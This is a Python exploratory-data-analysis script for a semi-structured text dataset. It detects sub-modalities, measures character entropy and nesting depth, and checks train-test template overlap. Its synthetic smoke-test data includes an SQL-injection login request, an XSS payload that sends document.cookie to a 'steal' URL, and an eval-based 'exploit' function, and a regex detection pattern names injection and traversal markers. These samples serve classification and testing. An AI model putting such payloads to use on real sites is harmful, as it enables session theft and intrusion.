#!/usr/bin/env python3
"""
Task 11 — Semi-Structured Log, Markup, Payload & Code: EDA & Dataset Pipeline
=============================================================================
Standalone script and reusable module providing:
  1. Non-Prose Sub-Modality Auto-Detector (`detect_semistructured_submodality`):
     Classifies corpus lines into `html_xml`, `json_kv`, `system_log`,
     `url_sql_payload`, `source_code`, or `general_text`.
  2. Character-Class & Structural Distribution Auditor (`audit_character_and_nesting_stats`):
     Audits punctuation/symbol density, hex/base64 token count, max bracket nesting depth,
     and character Shannon entropy across classes.
  3. Train-Test Structural Template Overlap Checker (`audit_template_repetition`):
     Extracts normalized structural templates (masking IPs, hex, numbers, and strings)
     to measure deterministic template repetition and train-test template overlap.

Usage:
    python eda_and_data.py --train-path train_folds.csv --test-path test.csv
    python eda_and_data.py --smoke-test
"""

from __future__ import annotations

import argparse
import math
import pathlib
import re
import site
import string
import sys
from collections import Counter
from dataclasses import dataclass
from typing import Dict, List, Optional, Sequence, Tuple

_venv_site = (
    pathlib.Path.home()
    / ".venv"
    / "lib"
    / f"python{sys.version_info.major}.{sys.version_info.minor}"
    / "site-packages"
)
if _venv_site.exists() and str(_venv_site) not in sys.path:
    site.addsitedir(str(_venv_site))

import numpy as np
import pandas as pd


@dataclass
class CFG:
    """Configuration for Semi-Structured Log & Code EDA."""

    train_path: str = "train_folds.parquet"
    test_path: str = "test.parquet"
    id_col: str = "id"
    text_col: str = "text"
    target_col: str = "label"
    fold_col: str = "fold"
    seed: int = 42
    smoke_test: bool = False


_HTML_PATTERN = re.compile(r"</?[a-zA-Z][a-zA-Z0-9:-]*(?:\s+[^<>]*)?>")
_JSON_KV_PATTERN = re.compile(r'^\s*[\{\[]|"[a-zA-Z0-9_.-]+"\s*:\s*')
_SYSLOG_PATTERN = re.compile(
    r"\b(?:\d{4}-\d{2}-\d{2}[T\s]\d{2}:\d{2}:\d{2}|(?:Jan|Feb|Mar|Apr|May|Jun|Jul|Aug|Sep|Oct|Nov|Dec)\s+\d{1,2}\s+\d{2}:\d{2}:\d{2})\b|"
    r"\b(?:\d{1,3}\.){3}\d{1,3}\b|\b(?:INFO|WARN|ERROR|DEBUG|CRITICAL|sshd|kernel|dfs\.)\b"
)
_PAYLOAD_PATTERN = re.compile(
    r"(?:https?://|[?&][a-zA-Z0-9_]+=\S+|\b(?:SELECT|UNION|INSERT|DROP|SLEEP|BENCHMARK)\b|"
    r"<\s*script|javascript:|\.\./|/etc/passwd)",
    re.IGNORECASE,
)
_CODE_PATTERN = re.compile(
    r"\b(?:def|class|import|from|return|function|const|let|var|public|private|void|int|struct)\b|"
    r"==|!=|<=|>=|=>|->|\{\s*\n"
)
_HEX_B64_PATTERN = re.compile(
    r"\b0x[0-9a-fA-F]{4,}\b|(?:%[0-9a-fA-F]{2}){2,}|\b[A-Za-z0-9+/]{24,}={0,2}\b"
)


def classify_single_line_modality(text: str) -> str:
    """Classify a single non-prose string into its primary semi-structured sub-modality."""
    s = str(text or "").strip()
    if not s:
        return "empty"
    if len(_HTML_PATTERN.findall(s)) >= 2 or (s.startswith("<") and s.endswith(">")):
        return "html_xml"
    if (s.startswith("{") and s.endswith("}")) or len(_JSON_KV_PATTERN.findall(s)) >= 2:
        return "json_kv"
    if _PAYLOAD_PATTERN.search(s):
        return "url_sql_payload"
    if _SYSLOG_PATTERN.search(s):
        return "system_log"
    if len(_CODE_PATTERN.findall(s)) >= 2:
        return "source_code"
    return "general_text"


def detect_semistructured_submodality(texts: Sequence[str]) -> pd.DataFrame:
    """Profile the distribution of sub-modalities across a dataset."""
    counts = Counter(classify_single_line_modality(t) for t in texts)
    total = max(len(texts), 1)
    rows = [
        {
            "sub_modality": mod,
            "count": cnt,
            "percentage": round(cnt * 100.0 / total, 2),
        }
        for mod, cnt in counts.most_common()
    ]
    return pd.DataFrame(rows)


def _shannon_entropy(s: str) -> float:
    if not s:
        return 0.0
    n = len(s)
    c = Counter(s)
    return -sum((v / n) * math.log2(v / n) for v in c.values())


def _max_nesting_depth(s: str) -> int:
    pairs = {"(": ")", "[": "]", "{": "}", "<": ">"}
    closing = {v: k for k, v in pairs.items()}
    depth = 0
    max_d = 0
    for ch in s:
        if ch in pairs:
            depth += 1
            max_d = max(max_d, depth)
        elif ch in closing:
            depth = max(0, depth - 1)
    return max_d


def audit_character_and_nesting_stats(
    df: pd.DataFrame, text_col: str, target_col: Optional[str] = None
) -> pd.DataFrame:
    """
    Audit character-class distributions (symbol/punctuation ratio, digit ratio,
    Shannon entropy, hex/base64 counts, max nesting depth) overall or per class.
    """
    punct_set = set(string.punctuation)
    records = []
    for idx, raw in enumerate(df[text_col].fillna("").astype(str)):
        c_len = max(len(raw), 1)
        sym_ratio = sum(1 for c in raw if c in punct_set) / c_len
        dig_ratio = sum(1 for c in raw if c.isdigit()) / c_len
        ent = _shannon_entropy(raw)
        hex_cnt = len(_HEX_B64_PATTERN.findall(raw))
        depth = _max_nesting_depth(raw)
        rec = {
            "char_len": len(raw),
            "symbol_ratio": sym_ratio,
            "digit_ratio": dig_ratio,
            "shannon_entropy": ent,
            "hex_b64_count": hex_cnt,
            "max_nesting_depth": depth,
        }
        if target_col and target_col in df.columns:
            rec[target_col] = df[target_col].iloc[idx]
        records.append(rec)

    stat_df = pd.DataFrame(records)
    if target_col and target_col in stat_df.columns:
        return (
            stat_df.groupby(target_col)
            .agg(
                count=("char_len", "count"),
                char_len_mean=("char_len", "mean"),
                symbol_ratio_mean=("symbol_ratio", "mean"),
                digit_ratio_mean=("digit_ratio", "mean"),
                entropy_mean=("shannon_entropy", "mean"),
                hex_b64_mean=("hex_b64_count", "mean"),
                max_depth_p90=("max_nesting_depth", lambda s: float(np.percentile(s, 90))),
            )
            .round(3)
            .reset_index()
        )
    return stat_df.mean(numeric_only=True).round(3).to_frame().T


def extract_structural_skeleton(text: str) -> str:
    """
    Normalize variable values (IPs, hex numbers, quoted strings, digits) into
    structural placeholders to measure template repetition across train and test.
    """
    s = str(text or "").strip()
    s = re.sub(r"\b(?:\d{1,3}\.){3}\d{1,3}(?::\d+)?\b", "<IP>", s)
    s = re.sub(r"\b0x[0-9a-fA-F]+\b", "<HEX>", s)
    s = re.sub(r'"[^"]*"|\'[^\']*\'', "<STR>", s)
    s = re.sub(r"\b\d+\b", "<NUM>", s)
    s = re.sub(r"\s+", " ", s)
    return s[:160]


def audit_template_repetition(
    train_texts: Sequence[str], test_texts: Sequence[str]
) -> Dict[str, float]:
    """Check how many test samples share an exact structural skeleton with training samples."""
    tr_skel = [extract_structural_skeleton(t) for t in train_texts]
    te_skel = [extract_structural_skeleton(t) for t in test_texts]

    tr_set = set(tr_skel)
    te_set = set(te_skel)
    shared = tr_set & te_set

    te_in_tr_instances = sum(1 for s in te_skel if s in tr_set)
    return {
        "unique_train_templates": float(len(tr_set)),
        "unique_test_templates": float(len(te_set)),
        "shared_unique_templates": float(len(shared)),
        "train_compression_ratio": round(len(tr_set) / max(len(tr_skel), 1), 4),
        "test_instances_matching_train_template_pct": round(
            100.0 * te_in_tr_instances / max(len(te_skel), 1), 2
        ),
    }


def generate_synthetic_semistruct_data(
    n_train: int = 100, n_test: int = 30, seed: int = 42
) -> Tuple[pd.DataFrame, pd.DataFrame]:
    rng = np.random.default_rng(seed)
    templates = {
        0: [
            '2026-11-10 08:12:{sec:02d} sshd[{pid}]: Accepted publickey for user_{uid} from 10.0.1.{ip} port {port} ssh2',
            '<div class="item-card"><span class="title">Product {uid}</span><span class="price">Rp {port}</span></div>',
        ],
        1: [
            "GET /login.php?user=admin'%20OR%20'1'='1'--&id={uid}&tok=0x{hex_val} HTTP/1.1",
            '<script>eval(window.location="http://192.168.1.{ip}/steal?c="+document.cookie)</script>',
        ],
        2: [
            '{{"event": "kernel_panic", "host": "node-{uid}", "code": "0x{hex_val}", "retry": {sec}}}',
            "def exploit_{uid}(buf):\n    if len(buf) > {port}:\n        return eval(buf)\n",
        ],
    }

    def _sample_rows(n: int, prefix: str, include_label: bool) -> List[Dict[str, object]]:
        rows: List[Dict[str, object]] = []
        for i in range(n):
            cls = i % 3
            tmpl = templates[cls][i % len(templates[cls])]
            text = tmpl.format(
                sec=int(rng.integers(10, 59)),
                pid=int(rng.integers(1000, 9999)),
                uid=int(rng.integers(1, 50)),
                ip=int(rng.integers(2, 250)),
                port=int(rng.integers(1024, 65000)),
                hex_val=f"{int(rng.integers(65536, 1048575)):x}",
            )
            row: Dict[str, object] = {"id": f"{prefix}_{i}", "text": text}
            if include_label:
                row["label"] = cls
                row["fold"] = i % 5
            rows.append(row)
        return rows

    return (
        pd.DataFrame(_sample_rows(n_train, "tr", True)),
        pd.DataFrame(_sample_rows(n_test, "te", False)),
    )


def load_table(path: str) -> pd.DataFrame:
    p = pathlib.Path(path)
    return pd.read_parquet(p) if p.suffix.lower() == ".parquet" else pd.read_csv(p)


def run_eda(train_df: pd.DataFrame, test_df: pd.DataFrame, cfg: CFG) -> Dict[str, float]:
    print("=" * 72)
    print("1. SEMI-STRUCTURED SUB-MODALITY AUTO-DETECTION (Train)")
    print("=" * 72)
    mod_df = detect_semistructured_submodality(train_df[cfg.text_col].values)
    print(mod_df.to_string(index=False))

    print("\n" + "=" * 72)
    print("2. CHARACTER-CLASS, ENTROPY & NESTING DEPTH BY CLASS")
    print("=" * 72)
    stats_df = audit_character_and_nesting_stats(train_df, cfg.text_col, cfg.target_col)
    print(stats_df.to_string(index=False))

    print("\n" + "=" * 72)
    print("3. STRUCTURAL TEMPLATE REPETITION & TRAIN-TEST OVERLAP")
    print("=" * 72)
    overlap = audit_template_repetition(
        train_df[cfg.text_col].values, test_df[cfg.text_col].values
    )
    for k, v in overlap.items():
        print(f"  {k:<44}: {v}")
    return overlap


def main() -> None:
    parser = argparse.ArgumentParser(description="Task 11 Semi-Structured Log & Code EDA")
    parser.add_argument("--train-path", type=str, default=CFG.train_path)
    parser.add_argument("--test-path", type=str, default=CFG.test_path)
    parser.add_argument("--text-col", type=str, default=CFG.text_col)
    parser.add_argument("--target-col", type=str, default=CFG.target_col)
    parser.add_argument("--smoke-test", action="store_true", help="Run synthetic smoke test")
    args = parser.parse_args()

    cfg = CFG(
        train_path=args.train_path,
        test_path=args.test_path,
        text_col=args.text_col,
        target_col=args.target_col,
        smoke_test=args.smoke_test,
    )

    if cfg.smoke_test:
        print("[SMOKE TEST] Generating synthetic semi-structured log/DOM/payload corpus...")
        train_df, test_df = generate_synthetic_semistruct_data(seed=cfg.seed)
        overlap = run_eda(train_df, test_df, cfg)
        assert overlap["test_instances_matching_train_template_pct"] > 50.0
        print("[SUCCESS] Task 11 EDA smoke test passed.")
    else:
        train_df = load_table(cfg.train_path)
        test_df = load_table(cfg.test_path)
        run_eda(train_df, test_df, cfg)


if __name__ == "__main__":
    main()
